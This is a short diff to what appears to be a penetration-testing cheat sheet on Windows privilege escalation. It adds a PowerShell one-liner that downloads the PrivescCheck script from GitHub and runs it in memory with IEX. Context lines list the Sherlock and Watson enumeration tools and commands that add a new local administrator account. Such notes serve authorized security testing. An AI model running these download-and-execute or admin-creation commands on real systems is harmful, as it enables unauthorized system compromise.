@@ -498,6 +498,10 @@ PHP:
   https://github.com/rasta-mouse/Sherlock   
   https://github.com/rasta-mouse/Watson   
 
+- One liner for privesccheck:   
+  `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1');Invoke-PrivescCheck -Extended -Report prvcheckreport -Format HTML,CSV`
+
+
 - Add new admin:
   `net user /add [username] [password]`  
   `net localgroup administrators [username] /add` 
